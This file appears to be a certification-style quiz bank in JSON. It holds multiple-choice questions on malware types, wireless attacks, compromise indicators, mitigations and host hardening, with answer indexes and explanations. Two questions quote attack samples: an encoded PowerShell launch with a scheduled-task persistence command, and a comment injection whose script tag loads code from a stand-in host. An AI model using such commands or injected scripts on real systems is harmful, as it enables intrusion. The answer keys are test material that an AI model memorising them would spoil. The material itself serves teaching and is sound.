@@ -1,0 +1,242 @@
+[
+  {
+    "domain": "D2",
+    "family": "malware",
+    "question": "An analyst investigates a marketing workstation and finds a hidden process that captures a screenshot every five minutes and uploads the images and microphone recordings nightly. No files are encrypted and no keystrokes are stored. Which of the following malware types is MOST likely present?",
+    "options": ["Keylogger", "Ransomware", "Spyware", "Trojan"],
+    "correctIndex": 2,
+    "explanation": "Spyware. Covert, broad surveillance of user activity - screenshots, audio, browsing - quietly collected and exfiltrated is spyware's signature; the keylogger option loses because no keystrokes are being recorded. The tell: spyware = broad covert collection of activity, keylogger = records keystrokes specifically, ransomware = encrypts and extorts, trojan = malware disguised as a legitimate program."
+  },
+  {
+    "domain": "D2",
+    "family": "malware",
+    "question": "A desktop team images ten new laptops, and the first vulnerability scan flags outdated preinstalled trial utilities and vendor toolbars that no employee uses. Nothing behaves maliciously. Which of the following BEST categorizes this software?",
+    "options": ["Bloatware", "Spyware", "Trojan", "Worm"],
+    "correctIndex": 0,
+    "explanation": "Bloatware. Unwanted preinstalled software is not malicious, but its unpatched code widens the attack surface, which is why the scan flags it and hardening removes it; spyware loses because nothing is collecting or exfiltrating data. The tell: bloatware = unwanted preinstalled software adding patchable attack surface, spyware = covert data collection, trojan = malware disguised as a legitimate app, worm = self-replicates across the network."
+  },
+  {
+    "domain": "D2",
+    "family": "malware",
+    "question": "Two weeks after a terminated administrator's account was disabled, an unrecognized script deletes project directories on the 1st of the month. No payment demand or note appears anywhere. Which of the following malware types is MOST likely responsible?",
+    "options": ["Ransomware", "Worm", "Rootkit", "Logic bomb"],
+    "correctIndex": 3,
+    "explanation": "Logic bomb. Dormant code detonating on a condition or date - classically planted by an insider before departure - fits the delayed, triggered destruction; ransomware loses because a destructive payload with no demand means no extortion scheme. The tell: logic bomb = payload triggered by a condition or date, ransomware = encrypts and demands payment, rootkit = hides at kernel level for persistence, worm = self-spreads with no trigger condition."
+  },
+  {
+    "domain": "D2",
+    "family": "malware",
+    "question": "External NetFlow records show a database server beaconing to an unknown host every 10 minutes, yet netstat, the process list, and antivirus on the server all report nothing unusual. Which of the following malware types BEST explains the discrepancy?",
+    "options": ["Trojan", "Rootkit", "Logic bomb", "Keylogger"],
+    "correctIndex": 1,
+    "explanation": "Rootkit. Kernel-level hooks intercept system calls, so on-host tools report a clean system while outside network evidence proves activity - detection typically requires booting from trusted external media; a trojan loses because it does not make the OS conceal its connections from local tools. The tell: rootkit = the OS itself lies (on-host tools disagree with external evidence), trojan = disguised as legitimate software, logic bomb = condition-triggered payload, keylogger = records keystrokes."
+  },
+  {
+    "domain": "D2",
+    "family": "ddos-network",
+    "question": "A wireless controller logs the following just before users report drops: 10:02:14 4,812 deauthentication frames received, source spoofed as corporate BSSID; 10:03:20 all clients disconnected from SSID CORP-WIFI. Which of the following attacks is forcing the clients off the network?",
+    "options": ["Evil twin", "Jamming", "Deauthentication attack", "Rogue access point"],
+    "correctIndex": 2,
+    "explanation": "Deauthentication attack. Spoofed 802.11 management frames order clients to disconnect - a wireless denial of service that often sets up an evil twin to catch the reconnections; evil twin loses because the log shows forged disconnect frames, not an imitation SSID accepting clients. The tell: deauthentication = spoofed management frames force disconnects, evil twin = attacker AP imitating your SSID, rogue AP = unauthorized AP attached to your network, jamming = raw RF interference with no forged frames."
+  },
+  {
+    "domain": "D2",
+    "family": "ddos-network",
+    "question": "During a wireless audit, an analyst finds a consumer access point an employee cabled into a conference room jack for convenience. It broadcasts the SSID HomeNet2 and bridges directly onto the corporate LAN. Which of the following BEST describes this device?",
+    "options": ["Rogue access point", "Evil twin", "On-path attack", "Deauthentication attack"],
+    "correctIndex": 0,
+    "explanation": "Rogue access point. Any unauthorized AP attached to your network is rogue, even with innocent intent, because it opens an unmanaged wireless door into the LAN; evil twin loses because the device broadcasts its own SSID rather than imitating the corporate one. The tell: rogue AP = unauthorized AP ON your network, evil twin = attacker AP IMITATING your SSID to lure clients, deauthentication = forged disconnect frames, on-path = an attacker relaying traffic between two parties."
+  },
+  {
+    "domain": "D2",
+    "family": "indicators",
+    "question": "An EDR alert shows the following process chain on a finance workstation: winword.exe -> powershell.exe -EncodedCommand JABzAD0A... followed by schtasks /create /tn Updater /sc onlogon. Which of the following indicator categories does this activity represent?",
+    "options": ["Out-of-cycle logging", "Malicious code", "Resource consumption", "Concurrent session usage"],
+    "correctIndex": 1,
+    "explanation": "Malicious code. An Office process spawning an obfuscated Base64 PowerShell one-liner that installs a persistence task is hostile script execution on the host; out-of-cycle logging loses because nothing here concerns when entries were recorded. The tell: malicious code = hostile scripts, macros, or injected code observed executing, out-of-cycle logging = entries at times they should not occur, resource consumption = unexplained CPU or bandwidth spikes, concurrent sessions = one account live in multiple sessions at once."
+  },
+  {
+    "domain": "D2",
+    "family": "indicators",
+    "question": "A web administrator reviewing the application log finds this stored comment submission: POST /comments body: user=guest&text=<script src=//cdn-stat.example/x.js>. Which of the following indicator categories does the submitted fragment represent?",
+    "options": ["Blocked content", "Resource inaccessibility", "Missing logs", "Malicious code"],
+    "correctIndex": 3,
+    "explanation": "Malicious code. A script tag injected into a comment field is hostile code planted to execute in other visitors' browsers, an application-layer malicious code indicator; blocked content loses because nothing was filtered or denied - the payload was accepted. The tell: malicious code = hostile script or injected code present in the environment, blocked content = security filters denying access attempts, resource inaccessibility = services suddenly unavailable, missing logs = gaps where entries should exist."
+  },
+  {
+    "domain": "D2",
+    "family": "indicators",
+    "question": "A security analyst reviews the overnight authentication log: 23:10-04:36 svc-backup: 214 failed logons from 198.51.100.7; 04:37 svc-backup: account locked out. Which of the following BEST describes the indicator and its likely cause?",
+    "options": ["Account lockout caused by a brute-force attack", "Account lockout caused by password spraying", "Impossible travel caused by credential replay", "Concurrent session usage caused by token theft"],
+    "correctIndex": 0,
+    "explanation": "Account lockout caused by a brute-force attack. Hundreds of failures hammering ONE account until the lockout threshold trips is the brute-force signature; password spraying loses because spraying spreads a few passwords across MANY accounts precisely to avoid triggering lockouts. The tell: brute force = many passwords against one account (lockouts fire), spraying = few passwords against many accounts (lockouts avoided), impossible travel = distant logins too close in time, concurrent sessions = simultaneous active sessions."
+  },
+  {
+    "domain": "D2",
+    "family": "indicators",
+    "question": "An application's session table shows an account authenticated at 08:04 from the corporate LAN and again at 15:52 from a residential ISP in another state. At 16:10 both sessions are still issuing requests. Which of the following indicators is this?",
+    "options": ["Impossible travel", "Out-of-cycle logging", "Concurrent session usage", "Account lockout"],
+    "correctIndex": 2,
+    "explanation": "Concurrent session usage. One account actively working from two places at the same moment points to stolen credentials or a hijacked session token; impossible travel loses because the logins were nearly eight hours apart - the anomaly is the simultaneous overlap, not the login sequence. The tell: concurrent sessions = the same account live in multiple sessions at once, impossible travel = sequential logins from distant places too close in time, out-of-cycle logging = oddly timed entries, account lockout = failed-attempt threshold tripped."
+  },
+  {
+    "domain": "D2",
+    "family": "indicators",
+    "question": "A help desk ticket reports a laptop that browses normally but times out on every connection to its EDR update server and several antivirus vendor sites. All other endpoints reach those sites fine. Which of the following indicators does this MOST likely represent?",
+    "options": ["Resource inaccessibility", "Blocked content", "Missing logs", "Resource consumption"],
+    "correctIndex": 1,
+    "explanation": "Blocked content. Malware commonly blocks an endpoint's access to security updates and antivirus sites so defenses cannot refresh, and only security destinations failing on one host is that pattern; resource inaccessibility loses because business files and services remain fully available. The tell: blocked content = access to specific content deliberately blocked, especially security sites, resource inaccessibility = files or services broadly unavailable, missing logs = gaps in the record, resource consumption = unexplained utilization spikes."
+  },
+  {
+    "domain": "D2",
+    "family": "indicators",
+    "question": "A SIEM shows the following for one user: 08:55 login success, source 81.2.69.142 (London); 09:05 logout; 09:20 login success, source 114.4.78.11 (Jakarta). Which of the following indicators should the analyst flag?",
+    "options": ["Concurrent session usage", "Account lockout", "Out-of-cycle logging", "Impossible travel"],
+    "correctIndex": 3,
+    "explanation": "Impossible travel. Sequential logins from London and Jakarta 25 minutes apart are physically impossible for one person, indicating compromised credentials; concurrent session usage loses because the London session ended before the Jakarta login - the sessions never overlap. The tell: impossible travel = sequential logins from distant locations too close in time, concurrent sessions = simultaneous overlapping sessions, account lockout = failed attempts tripping a threshold, out-of-cycle logging = entries at abnormal times."
+  },
+  {
+    "domain": "D2",
+    "family": "indicators",
+    "question": "A SOC's dark-web monitoring service finds 300 current employee usernames and passwords in a new paste-site dump. No internal alert, ticket, or log entry has suggested any breach. Which of the following indicators is this?",
+    "options": ["Published/documented data", "Missing logs", "Blocked content", "Concurrent session usage"],
+    "correctIndex": 0,
+    "explanation": "Published/documented. The organization's data appearing publicly - paste sites, leak forums, dark-web markets - is often the first evidence of a quiet breach that internal tooling never caught; missing logs loses because no gap in logging has been observed, only silence. The tell: published/documented = your data or credentials surfacing publicly, missing logs = expected entries absent from the record, blocked content = filtered or denied access to content, concurrent sessions = one account live in several sessions at once."
+  },
+  {
+    "domain": "D2",
+    "family": "indicators",
+    "question": "Reviewing an intrusion, an analyst sees the SIEM received no firewall events from 01:00 to 07:00 on the night of the compromise, although the firewall stayed online and entries resume normally afterward. Which of the following indicators should the analyst suspect?",
+    "options": ["Out-of-cycle logging", "Resource inaccessibility", "Missing logs", "Blocked content"],
+    "correctIndex": 2,
+    "explanation": "Missing logs. A clean gap exactly spanning the intrusion window, with normal logging on either side, indicates the attacker deleted or suppressed entries to erase the trail; out-of-cycle logging loses because that means entries appearing at odd times, and here the entries are absent. The tell: missing logs = expected entries gone (gaps or cleared logs), out-of-cycle logging = entries timestamped when no activity should occur, resource inaccessibility = services unavailable, blocked content = access to content denied."
+  },
+  {
+    "domain": "D2",
+    "family": "mitigations",
+    "question": "An audit finds the payroll share readable by every domain user. The administrator removes the broad grant and assigns read and modify rights to only the two HR security groups. Which of the following mitigations was applied?",
+    "options": ["Network access control list", "Permissions", "Segmentation", "Application allow list"],
+    "correctIndex": 1,
+    "explanation": "Permissions. The fix reassigns the rights granted on the file share itself - who may read or modify the resource; a network access control list loses because that is an ordered permit/deny rule list on network devices, not rights on a file. The tell: permissions = rights assigned on files, folders, and shares, network ACL = ordered traffic rules by source, destination, and port, segmentation = dividing the network into zones, application allow list = only approved apps may run."
+  },
+  {
+    "domain": "D2",
+    "family": "mitigations",
+    "question": "A security team closes two findings: read rights on a finance folder are trimmed to one group, and a router's rule list is updated to deny external SSH. Which of the following pairs names these two mitigations in order?",
+    "options": ["Access control list, then permissions", "Segmentation, then isolation", "Application allow list, then hardening", "Permissions, then access control list"],
+    "correctIndex": 3,
+    "explanation": "Permissions, then access control list. Rights granted on the folder are permissions, while the router's ordered permit/deny rule list is an access control list; the reversed pairing loses because it assigns the network rule list to the file and the file rights to the router. The tell: permissions = the rights themselves on a file or share, ACL = the ordered rule list a device evaluates by source, destination, and port, segmentation = network zones, isolation = complete cutoff."
+  },
+  {
+    "domain": "D2",
+    "family": "mitigations",
+    "question": "Retail point-of-sale terminals must run only the payment application, and unknown malware must be unable to execute no matter what a user attempts to launch. Which of the following mitigations BEST meets this requirement?",
+    "options": ["Application allow list", "Application deny list", "Least privilege", "Endpoint antivirus"],
+    "correctIndex": 0,
+    "explanation": "Application allow list. Default-deny execution permits only the approved payment app, so anything else - including never-before-seen malware - simply cannot run; a deny list loses because it blocks only KNOWN bad software, and unknown malware sails past it. The tell: allow list = default deny, only approved apps execute, deny list = default allow, blocks only listed bad apps, least privilege = minimum rights, not execution control, antivirus = detects known malicious code rather than restricting what may run."
+  },
+  {
+    "domain": "D2",
+    "family": "mitigations",
+    "question": "Ransomware is actively encrypting a database server. The incident commander requires that the server exchange no traffic with any system until forensics completes; an engineer instead proposes moving it to a restricted VLAN. Which of the following meets the stated requirement?",
+    "options": ["Segmentation", "Decommissioning", "Isolation", "Network access control list"],
+    "correctIndex": 2,
+    "explanation": "Isolation. The requirement is a complete cutoff - zero communication in either direction - which only full isolation provides; segmentation loses because a restricted VLAN still permits some allowed paths, and the requirement is NO traffic. The tell: isolation = totally cut off from everything, segmentation = restricted but still-connected zones, network ACL = rule-filtered traffic still flows, decommissioning = permanently retiring the asset, which would destroy forensic value here."
+  },
+  {
+    "domain": "D2",
+    "family": "mitigations",
+    "question": "A vendor releases a fix for a flaw being actively exploited on a company's fully supported web servers, which can be rebooted in tonight's maintenance window. Which of the following is the BEST mitigation?",
+    "options": ["Move the servers to a restricted segment", "Apply the vendor patch tonight", "Increase monitoring of the servers", "Purchase cyber insurance for the exposure"],
+    "correctIndex": 1,
+    "explanation": "Patching. Applying the vendor fix removes the flaw itself, and nothing in the scenario blocks it - the fix exists, the systems are supported, and a window is available; segmentation loses because compensating controls are for when patching is NOT possible. The tell: patch available and applicable = patch, cannot patch (end-of-life, uptime constraint) = compensate with segmentation and monitoring, actively infected host = isolate, insurance = transfers financial risk without fixing anything."
+  },
+  {
+    "domain": "D2",
+    "family": "mitigations",
+    "question": "A plant's end-of-life process controller no longer receives vendor updates but must stay in service for three more years. A scanner flags a critical remotely exploitable flaw. Which of the following is the BEST mitigation?",
+    "options": ["Apply the latest vendor patch", "Decommission the controller immediately", "Install endpoint protection on the controller", "Segment the controller and add monitoring"],
+    "correctIndex": 3,
+    "explanation": "Segmentation with added monitoring. When patching is impossible and the asset must stay in service, a compensating control that limits reachability and watches for exploitation is the correct move; applying the vendor patch loses because an end-of-life product has no patch to apply. The tell: can patch = patch, cannot patch but must keep running = segment and monitor (compensating control), decommissioning fails the stay-in-service constraint, and endpoint agents rarely install on closed end-of-life controllers."
+  },
+  {
+    "domain": "D2",
+    "family": "host-hardening",
+    "question": "Sales laptops spend weeks on hotel and airport networks where the corporate perimeter cannot filter traffic reaching them. The security team wants each laptop to block unsolicited inbound connections wherever it is. Which of the following should be deployed?",
+    "options": ["A host-based firewall", "A host-based intrusion prevention system", "Full-disk encryption", "Disabling unused ports and protocols"],
+    "correctIndex": 0,
+    "explanation": "Host-based firewall. Per-host inbound and outbound filtering by port, address, and application travels with the laptop, protecting it when no network firewall stands in front; HIPS loses because the stated need is blocking unsolicited connections by rule, not inspecting allowed traffic for exploit patterns. The tell: host-based firewall = filters connections by attributes (port, IP, app), HIPS = inspects traffic and drops known attack patterns, disabling ports/protocols = shrinks listening services, full-disk encryption = protects data at rest, not connections."
+  },
+  {
+    "domain": "D2",
+    "family": "host-hardening",
+    "question": "A security engineer describes two host protections: one rejects inbound traffic that is not from the management subnet based purely on source address and port; the other inspects permitted traffic and drops packets matching exploit signatures. Which of the following pairs is correct?",
+    "options": ["HIPS, then host-based firewall", "Host-based firewall, then HIDS", "Host-based firewall, then HIPS", "HIDS, then HIPS"],
+    "correctIndex": 2,
+    "explanation": "Host-based firewall, then HIPS. Filtering by connection attributes such as source and port is firewall logic, while inspecting already-allowed traffic for exploit patterns and dropping it is prevention logic; the HIDS pairing loses because a HIDS only alerts and never drops packets. The tell: host-based firewall = \"that port is closed\", HIPS = \"this packet matches an exploit, dropped\", HIDS = detects and alerts only, with no blocking."
+  },
+  {
+    "domain": "D2",
+    "family": "host-hardening",
+    "question": "A public web server must keep port 443 open, but the team wants traffic that already passed the network firewall to be inspected on the host and dropped when it matches known exploit patterns. Which of the following should be installed?",
+    "options": ["A host-based intrusion detection system", "A host-based intrusion prevention system", "A host-based firewall", "An application allow list"],
+    "correctIndex": 1,
+    "explanation": "Host-based intrusion prevention system. A HIPS sits in the host's traffic path, matches signatures and behavior, and actively drops malicious packets that a port-based filter must let through; a HIDS loses because it only detects and alerts, never blocks. The tell: HIPS = inspects and blocks on the host, HIDS = inspects and alerts only, host-based firewall = filters by port and address, which cannot help when the port must stay open, allow list = controls which applications execute, not network traffic."
+  },
+  {
+    "domain": "D2",
+    "family": "host-hardening",
+    "question": "During a review, a security analyst notes that a database server's host firewall correctly allowed traffic on port 1433, yet an exploit inside that allowed session compromised the service. Which of the following host protections would have blocked the exploit?",
+    "options": ["Stricter host firewall rules", "Disabling unused ports and protocols", "Changing default passwords", "A host-based intrusion prevention system"],
+    "correctIndex": 3,
+    "explanation": "Host-based intrusion prevention system. The attack rode a legitimately allowed connection, so only on-host inspection that recognizes and drops exploit patterns inside permitted traffic could stop it; stricter firewall rules lose because the port must stay open for the database and the connection's attributes were legitimate. The tell: HIPS = blocks malicious content inside allowed connections, host firewall = permits or denies by attributes and cannot judge payloads, disabling ports = removes unneeded listeners, default password changes = stops factory-credential logins."
+  },
+  {
+    "domain": "D2",
+    "family": "host-hardening",
+    "question": "A scan of a newly built server returns: 23/tcp open telnet; 445/tcp open microsoft-ds (SMBv1 enabled); 443/tcp open https. Only HTTPS is required for the server's role. Which of the following hardening steps directly remediates the findings?",
+    "options": ["Changing default passwords", "Disabling unused ports and protocols", "Installing a host-based intrusion prevention system", "Removing unnecessary software"],
+    "correctIndex": 1,
+    "explanation": "Disabling unused ports and protocols. Turning off Telnet and SMBv1 removes the unneeded listening services entirely, so the exposures disappear from the next scan; removing unnecessary software loses because these findings are enabled services and protocols, not installed application packages. The tell: disabling ports/protocols = shrink the set of listening services, software removal = uninstall unneeded packages, default password changes = kill factory logins, HIPS = drop exploit-pattern traffic while the service keeps listening."
+  },
+  {
+    "domain": "D2",
+    "family": "host-hardening",
+    "question": "A hardening baseline for new Linux servers includes the requirement: reduce the number of services accepting network connections to the minimum the role needs. Which of the following steps satisfies this line item?",
+    "options": ["Removal of unnecessary software", "Installing endpoint protection", "Disabling unused ports and protocols", "Changing default passwords"],
+    "correctIndex": 2,
+    "explanation": "Disabling unused ports and protocols. Stopping unneeded services and closing their listeners is the step that directly shrinks how many services accept connections; removal of unnecessary software loses because it targets installed packages, and a package can be present without listening on the network. The tell: disabling ports/protocols = fewer listening services, software removal = fewer installed (patchable) packages, endpoint protection = detect and block malware locally, default password changes = eliminate factory credentials."
+  },
+  {
+    "domain": "D2",
+    "family": "host-hardening",
+    "question": "A technician is finishing the deployment checklist for 60 new IP cameras. Attackers routinely try the factory logins printed in the vendor's public manual. Which of the following checklist steps stops those attempts from succeeding?",
+    "options": ["Changing the default passwords", "Disabling unused ports and protocols", "Installing a host-based firewall", "Removing unnecessary software"],
+    "correctIndex": 0,
+    "explanation": "Default password changes. Replacing factory credentials at deployment means the publicly documented logins no longer work, which directly defeats attackers who try them; disabling ports and protocols loses because the management interface must remain reachable - the flaw is the known credential, not the open service. The tell: default password changes = kill factory logins, disabling ports/protocols = remove unneeded listeners, host-based firewall = filter connections by rule, software removal = shrink patchable surface."
+  },
+  {
+    "domain": "D2",
+    "family": "host-hardening",
+    "question": "After several network printers were reconfigured by an outsider, an investigation finds each web console still accepted the administrator credentials from the publicly downloadable setup guide. Which of the following hardening steps would have prevented the compromise?",
+    "options": ["Installing a host-based intrusion prevention system", "Removing unnecessary software", "Disabling unused ports and protocols", "Changing default passwords during deployment"],
+    "correctIndex": 3,
+    "explanation": "Default password changes. The outsider simply logged in with documented factory credentials, so replacing them during deployment removes the exact access path used; disabling ports and protocols loses because the web console is a needed management service - the problem was the credential, not the listener. The tell: default password changes = factory logins stop working, disabling ports/protocols = unneeded services stop listening, HIPS = drops exploit-pattern traffic (no exploit was used here), software removal = fewer installed packages."
+  },
+  {
+    "domain": "D2",
+    "family": "host-hardening",
+    "question": "A vulnerability scan of a new application server flags vendor sample applications and an unused database administration console left over from installation. Which of the following hardening steps remediates these findings?",
+    "options": ["Disabling unused ports and protocols", "Removal of unnecessary software", "Changing default passwords", "Installing a host-based firewall"],
+    "correctIndex": 1,
+    "explanation": "Removal of unnecessary software. Uninstalling the sample apps and unused console deletes the vulnerable code outright, so there is nothing left to patch or exploit; disabling ports and protocols loses because these findings are installed packages, and stopping a listener still leaves the vulnerable software on disk. The tell: software removal = uninstall unneeded (patchable) packages, disabling ports/protocols = stop unneeded listening services, default password changes = replace factory logins, host-based firewall = rule-based connection filtering."
+  },
+  {
+    "domain": "D2",
+    "family": "host-hardening",
+    "question": "A desktop engineering team wants to shrink each workstation's patch workload and attack surface by eliminating applications that telemetry shows no employee has launched in a year. Which of the following hardening steps is this?",
+    "options": ["Configuration enforcement", "Application allow list", "Removal of unnecessary software", "Disabling unused ports and protocols"],
+    "correctIndex": 2,
+    "explanation": "Removal of unnecessary software. Every installed package is attack surface that must be patched, so uninstalling unused applications reduces both exposure and maintenance effort; an application allow list loses because blocking execution still leaves the vulnerable packages installed and needing patches. The tell: software removal = the package is gone, allow list = the package cannot run but remains installed, disabling ports/protocols = fewer listening services, configuration enforcement = automatically holding settings at the baseline."
+  }
+]
